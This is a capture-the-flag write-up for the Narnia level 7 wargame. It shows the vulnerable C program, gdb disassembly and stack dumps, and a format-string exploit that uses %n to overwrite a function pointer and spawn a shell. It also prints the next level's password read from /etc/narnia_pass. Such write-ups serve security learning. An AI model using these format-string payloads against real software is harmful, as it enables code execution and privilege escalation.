======= SOURCE ================================
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>

int goodfunction();
int hackedfunction();

int vuln(const char *format){
        char buffer[128];
        int (*ptrf)();

        memset(buffer, 0, sizeof(buffer));
        printf("goodfunction() = %p\n", goodfunction);
        printf("hackedfunction() = %p\n\n", hackedfunction);

        ptrf = goodfunction;
        printf("before : ptrf() = %p (%p)\n", ptrf, &ptrf);

        printf("I guess you want to come to the hackedfunction...\n");
        sleep(2);
        ptrf = goodfunction;
  
        snprintf(buffer, sizeof buffer, format);

        return ptrf();
}

int main(int argc, char **argv){
        if (argc <= 1){
                fprintf(stderr, "Usage: %s <buffer>\n", argv[0]);
                exit(-1);
        }
        exit(vuln(argv[1]));
}

int goodfunction(){
        printf("Welcome to the goodfunction, but i said the Hackedfunction..\n");
        fflush(stdout);
        
        return 0;
}

int hackedfunction(){
        printf("Way to go!!!!");
	fflush(stdout);
        system("/bin/sh");

        return 0;
}
========================================================================================
At a quick glance, it looks like we're supposed to change the function pointer prtf from goodfunction to hackedfunction. 
I'm going to try to do this using the call to snprintf like in narnia5. Here again we control the third parameter.
We can't use a regular overflow from buffer to ptrf becau of the order on the stack and the "sizeof buffer" parameter in snprintf.
Not sure what the sleep(2) call is there for...
That being said let's fire up gdb
====================== debug me some elf ===============================================
narnia7@narnia:~$ gdb /narnia/narnia7

(gdb) disas vuln
Dump of assembler code for function vuln:
   0x080485cd <+0>:	push   %ebp
   0x080485ce <+1>:	mov    %esp,%ebp
   0x080485d0 <+3>:	sub    $0xa8,%esp
   0x080485d6 <+9>:	movl   $0x80,0x8(%esp)
   0x080485de <+17>:	movl   $0x0,0x4(%esp)
   0x080485e6 <+25>:	lea    -0x88(%ebp),%eax
   0x080485ec <+31>:	mov    %eax,(%esp)
   0x080485ef <+34>:	call   0x80484b0 <memset@plt>
   0x080485f4 <+39>:	movl   $0x80486e0,0x4(%esp)
   0x080485fc <+47>:	movl   $0x80487d0,(%esp)
   0x08048603 <+54>:	call   0x8048420 <printf@plt>
   0x08048608 <+59>:	movl   $0x8048706,0x4(%esp)
   0x08048610 <+67>:	movl   $0x80487e5,(%esp)
   0x08048617 <+74>:	call   0x8048420 <printf@plt>
   0x0804861c <+79>:	movl   $0x80486e0,-0x8c(%ebp)
   0x08048626 <+89>:	mov    -0x8c(%ebp),%eax
   0x0804862c <+95>:	lea    -0x8c(%ebp),%edx
   0x08048632 <+101>:	mov    %edx,0x8(%esp)
   0x08048636 <+105>:	mov    %eax,0x4(%esp)
   0x0804863a <+109>:	movl   $0x80487fd,(%esp)
   0x08048641 <+116>:	call   0x8048420 <printf@plt>
   0x08048646 <+121>:	movl   $0x8048818,(%esp)
   0x0804864d <+128>:	call   0x8048450 <puts@plt>
   0x08048652 <+133>:	movl   $0x2,(%esp)
   0x08048659 <+140>:	call   0x8048440 <sleep@plt>
   0x0804865e <+145>:	movl   $0x80486e0,-0x8c(%ebp)
   0x08048668 <+155>:	mov    0x8(%ebp),%eax
   0x0804866b <+158>:	mov    %eax,0x8(%esp)
   0x0804866f <+162>:	movl   $0x80,0x4(%esp)
   0x08048677 <+170>:	lea    -0x88(%ebp),%eax
   0x0804867d <+176>:	mov    %eax,(%esp)
   0x08048680 <+179>:	call   0x80484c0 <snprintf@plt>
   0x08048685 <+184>:	mov    -0x8c(%ebp),%eax
   0x0804868b <+190>:	call   *%eax
   0x0804868d <+192>:	leave  
   0x0804868e <+193>:	ret    
End of assembler dump.
(gdb) b *0x08048685
Breakpoint 1 at 0x8048685
(gdb) r $(python -c'print "A"*50')				############ just taking a look at the stack layout
Starting program: /narnia/narnia7 $(python -c'print "A"*50')
goodfunction() = 0x80486e0
hackedfunction() = 0x8048706

before : ptrf() = 0x80486e0 (0xffffd64c)
I guess you want to come to the hackedfunction...

Breakpoint 1, 0x08048685 in vuln ()
(gdb) x/100x $esp
0xffffd630:	0xffffd650	0x00000080	0xffffd8c5	0x08048238
0xffffd640:	0xffffd6a8	0xf7ffda94	0x00000000	0x080486e0
0xffffd650:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd660:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd670:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd680:	0x00004141	0x00000000	0x00000000	0x00000000
0xffffd690:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd6a0:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd6b0:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd6c0:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd6d0:	0x00000002	0xffffd794	0xffffd6f8	0x080486d8
0xffffd6e0:	0xffffd8c5	0xf7ffd000	0x0804874b	0xf7fcc000
0xffffd6f0:	0x08048740	0x00000000	0x00000000	0xf7e3cad3
0xffffd700:	0x00000002	0xffffd794	0xffffd7a0	0xf7feacca
0xffffd710:	0x00000002	0xffffd794	0xffffd734	0x08049b24
0xffffd720:	0x080482a8	0xf7fcc000	0x00000000	0x00000000
0xffffd730:	0x00000000	0xb3b432cc	0x8b8f16dc	0x00000000
0xffffd740:	0x00000000	0x00000000	0x00000002	0x080484d0
0xffffd750:	0x00000000	0xf7ff04c0	0xf7e3c9e9	0xf7ffd000
0xffffd760:	0x00000002	0x080484d0	0x00000000	0x080484f1
0xffffd770:	0x0804868f	0x00000002	0xffffd794	0x08048740
0xffffd780:	0x080487b0	0xf7feb160	0xffffd78c	0x0000001c
0xffffd790:	0x00000002	0xffffd8b5	0xffffd8c5	0x00000000
0xffffd7a0:	0xffffd8f8	0xffffd908	0xffffd91c	0xffffd93b
0xffffd7b0:	0xffffd94e	0xffffd957	0xffffd964	0xffffde85
(gdb) c
Continuing.
Welcome to the goodfunction, but i said the Hackedfunction..
[Inferior 1 (process 122) exited normally]
(gdb) r $(python -c'print "\x4c\xd6\xff\xff"+"%x"*50')
Starting program: /narnia/narnia7 $(python -c'print "\x0c\xd6\xff\xff"+"%x"*50') ########### let's see what %x shows
goodfunction() = 0x80486e0
hackedfunction() = 0x8048706

before : ptrf() = 0x80486e0 (0xffffd60c)
I guess you want to come to the hackedfunction...

Breakpoint 1, 0x08048685 in vuln ()
(gdb) x/100x $esp
0xffffd5f0:	0xffffd610	0x00000080	0xffffd88f	0x08048238
0xffffd600:	0xffffd668	0xf7ffda94	0x00000000	0x080486e0
0xffffd610:	0xffffd64c	0x38343038	0x66383332	0x64666666
0xffffd620:	0x66383636	0x64666637	0x30343961	0x38343038
0xffffd630:	0x66306536	0x64666666	0x33633436	0x33343338
0xffffd640:	0x36383330	0x33383336	0x36323333	0x36363634
0xffffd650:	0x36363636	0x33383336	0x36363336	0x36363634
0xffffd660:	0x33373336	0x33343330	0x33313639	0x33343338
0xffffd670:	0x36383330	0x36303336	0x36363335	0x36363634
0xffffd680:	0x33363636	0x33333633	0x33363334	0x00343333
0xffffd690:	0x00000002	0xffffd754	0xffffd6b8	0x080486d8
0xffffd6a0:	0xffffd88f	0xf7ffd000	0x0804874b	0xf7fcc000
0xffffd6b0:	0x08048740	0x00000000	0x00000000	0xf7e3cad3
0xffffd6c0:	0x00000002	0xffffd754	0xffffd760	0xf7feacca
0xffffd6d0:	0x00000002	0xffffd754	0xffffd6f4	0x08049b24
0xffffd6e0:	0x080482a8	0xf7fcc000	0x00000000	0x00000000
0xffffd6f0:	0x00000000	0x321967d7	0x0a21c3c7	0x00000000
0xffffd700:	0x00000000	0x00000000	0x00000002	0x080484d0
0xffffd710:	0x00000000	0xf7ff04c0	0xf7e3c9e9	0xf7ffd000
0xffffd720:	0x00000002	0x080484d0	0x00000000	0x080484f1
0xffffd730:	0x0804868f	0x00000002	0xffffd754	0x08048740
0xffffd740:	0x080487b0	0xf7feb160	0xffffd74c	0x0000001c
0xffffd750:	0x00000002	0xffffd87f	0xffffd88f	0x00000000
0xffffd760:	0xffffd8f8	0xffffd908	0xffffd91c	0xffffd93b
0xffffd770:	0xffffd94e	0xffffd957	0xffffd964	0xffffde85
(gdb) r $(python -c'print "\x06\x87\x04\x08"+"%x"*50')
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /narnia/narnia7 $(python -c'print "\x06\x87\x04\x08"+"%x"*50') ############ seeing what the stack looks like if we point to hackedfunction
goodfunction() = 0x80486e0
hackedfunction() = 0x8048706

before : ptrf() = 0x80486e0 (0xffffd60c)
I guess you want to come to the hackedfunction...

Breakpoint 1, 0x08048685 in vuln ()
(gdb) x/100x $esp
0xffffd5f0:	0xffffd610	0x00000080	0xffffd88f	0x08048238
0xffffd600:	0xffffd668	0xf7ffda94	0x00000000	0x080486e0
0xffffd610:	0x08048706	0x38343038	0x66383332	0x64666666
0xffffd620:	0x66383636	0x64666637	0x30343961	0x38343038
0xffffd630:	0x38306536	0x37383430	0x38333630	0x30333433
0xffffd640:	0x36363833	0x33333833	0x34363233	0x36363636
0xffffd650:	0x36363636	0x36333833	0x34363633	0x36363636
0xffffd660:	0x30333733	0x39333433	0x38333136	0x30333433
0xffffd670:	0x38333833	0x35363033	0x37333633	0x34333833
0xffffd680:	0x38333033	0x36333333	0x30333033	0x00333333
0xffffd690:	0x00000002	0xffffd754	0xffffd6b8	0x080486d8
0xffffd6a0:	0xffffd88f	0xf7ffd000	0x0804874b	0xf7fcc000
0xffffd6b0:	0x08048740	0x00000000	0x00000000	0xf7e3cad3
0xffffd6c0:	0x00000002	0xffffd754	0xffffd760	0xf7feacca
0xffffd6d0:	0x00000002	0xffffd754	0xffffd6f4	0x08049b24
0xffffd6e0:	0x080482a8	0xf7fcc000	0x00000000	0x00000000
0xffffd6f0:	0x00000000	0xc8d02895	0xf0e88c85	0x00000000
0xffffd700:	0x00000000	0x00000000	0x00000002	0x080484d0
0xffffd710:	0x00000000	0xf7ff04c0	0xf7e3c9e9	0xf7ffd000
0xffffd720:	0x00000002	0x080484d0	0x00000000	0x080484f1
0xffffd730:	0x0804868f	0x00000002	0xffffd754	0x08048740
0xffffd740:	0x080487b0	0xf7feb160	0xffffd74c	0x0000001c
0xffffd750:	0x00000002	0xffffd87f	0xffffd88f	0x00000000
0xffffd760:	0xffffd8f8	0xffffd908	0xffffd91c	0xffffd93b
0xffffd770:	0xffffd94e	0xffffd957	0xffffd964	0xffffde85
(gdb) 

Looks like the stack is the same; I'm going to chew on this for a bit... see y'all in a few

====================================================================================
With a bit of poking around I found what I wanted which is AAAA on the stack twice, once written, once read

(gdb) r $(python -c'print "AAAA"+"%08x"*6')
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /narnia/narnia7 $(python -c'print "AAAA"+"%08x"*6')
goodfunction() = 0x80486e0
hackedfunction() = 0x8048706

before : ptrf() = 0x80486e0 (0xffffd65c)
I guess you want to come to the hackedfunction...

Breakpoint 1, 0x08048685 in vuln ()
(gdb) x/10s $esp
0xffffd640:	"`\326\377\377\200"
0xffffd646:	""
0xffffd647:	""
0xffffd648:	"\334\330\377\377\070\202\004\b\270\326\377\377\224\332\377\367"
0xffffd659:	""
0xffffd65a:	""
0xffffd65b:	""
0xffffd65c:	"\340\206\004\bAAAA08048238ffffd6b8f7ffda9400000000080486e041414141"
0xffffd695:	""
0xffffd696:	""

now we can start playing around with writing mem

(gdb) r $(python -c'print "\x5c\xd6\xff\xff"+"%08x"*5+"%n"')
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /narnia/narnia7 $(python -c'print "\x5c\xd6\xff\xff"+"%08x"*5+"%n"')
goodfunction() = 0x80486e0
hackedfunction() = 0x8048706

before : ptrf() = 0x80486e0 (0xffffd65c)
I guess you want to come to the hackedfunction...

Breakpoint 1, 0x08048685 in vuln ()
(gdb) x/10s $esp
0xffffd640:	"`\326\377\377\200"
0xffffd646:	""
0xffffd647:	""
0xffffd648:	"\336\330\377\377\070\202\004\b\270\326\377\377\224\332\377\367"
0xffffd659:	""
0xffffd65a:	""
0xffffd65b:	""
0xffffd65c:	","
0xffffd65e:	""
0xffffd65f:	""
(gdb) c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x0000002c in ?? ()
(gdb) 

Check it out!! it's breakable!!

I want to write 0x8048706, so far I have 0x0000002c and this is the smallest it can get... I think...
So I will overflow to the next byte to get 0x00008706. 

(gdb) r $(python -c'print "\x5c\xd6\xff\xff"+"%08x"*4+"%34530x"+"%n"')
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /narnia/narnia7 $(python -c'print "\x5c\xd6\xff\xff"+"%08x"*4+"%34530x"+"%n"')
goodfunction() = 0x80486e0
hackedfunction() = 0x8048706

before : ptrf() = 0x80486e0 (0xffffd65c)
I guess you want to come to the hackedfunction...

Breakpoint 1, 0x08048685 in vuln ()
(gdb) c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x00008706 in ?? ()
(gdb) 

=================== Bad form solution =============================
I call this solution "bad form" because I think there's a more elegant way of writing to ptrf() byte by byte. I will get to that in the next paragraph.
I just tried this to see if it would work:

0x8048706 is 134514438 in dec, remove the already printed 36 bytes from 134514438 and you get 134514402

narnia7@narnia:~$ /narnia/narnia7 $(python -c'print "\x5c\xd6\xff\xff"+"%08x"*4+"%134514402x"+"%n"')
goodfunction() = 0x80486e0
hackedfunction() = 0x8048706

before : ptrf() = 0x80486e0 (0xffffd66c)
I guess you want to come to the hackedfunction...
Welcome to the goodfunction, but i said the Hackedfunction..

ptrf() changed locations because im not in gdb.

narnia7@narnia:~$ /narnia/narnia7 $(python -c'print "\x6c\xd6\xff\xff"+"%08x"*4+"%134514402x"+"%n"')
goodfunction() = 0x80486e0
hackedfunction() = 0x8048706

before : ptrf() = 0x80486e0 (0xffffd66c)
I guess you want to come to the hackedfunction...
Way to go!!!!$ whoami
narnia8
$ cat /etc/narnia_pass/narnia8
mohthuphog
$ 

Splat ;)

=============== More elegant =================================================
(gdb) r $(python -c'print "\x6c\xd6\xff\xff"+"JUNK"+"\x6d\xd6\xff\xff"+"JUNK"+"\x6e\xd6\xff\xff"+"JUNK"+"\x6f\xd6\xff\xff"+"JUNK"+"%x%x%x%x"*20')
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /narnia/narnia7 $(python -c'print "\x6c\xd6\xff\xff"+"JUNK"+"\x6d\xd6\xff\xff"+"JUNK"+"\x6e\xd6\xff\xff"+"JUNK"+"\x6f\xd6\xff\xff"+"JUNK"+"%x%x%x%x"*20')
goodfunction() = 0x80486e0
hackedfunction() = 0x8048706

before : ptrf() = 0x80486e0 (0xffffd5bc)
I guess you want to come to the hackedfunction...

Breakpoint 1, 0x08048685 in vuln ()
(gdb) x/10s $esp
0xffffd5a0:	"\300\325\377\377\200"
0xffffd5a6:	""
0xffffd5a7:	""
0xffffd5a8:	"8\330\377\377\070\202\004\b\030\326\377\377\224\332\377\367"
0xffffd5b9:	""
0xffffd5ba:	""
0xffffd5bb:	""
0xffffd5bc:	"\340\206\004\bl\326\377\377JUNKm\326\377\377JUNKn\326\377\377JUNKo\326\377\377JUNK8048238ffffd618f7ffda94080486e0ffffd66c4b4e554affffd66d4b4e554affffd66e4b4e554affffd66f4b4e554a"
0xffffd640:	"\002"
0xffffd642:	""


